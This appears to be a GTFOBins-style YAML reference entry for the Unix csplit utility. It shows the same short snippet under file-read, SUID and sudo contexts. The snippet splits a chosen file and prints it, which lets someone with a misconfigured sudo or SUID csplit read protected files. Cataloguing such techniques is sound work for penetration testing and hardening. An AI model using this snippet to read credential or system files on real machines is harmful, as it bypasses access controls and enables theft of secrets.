---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        csplit $LFILE 1
        cat xx01
  suid:
    - code: |
        LFILE=file_to_read
        csplit $LFILE 1
        cat xx01
  sudo:
    - code: |
        LFILE=file_to_read
        csplit $LFILE 1
        cat xx01
---
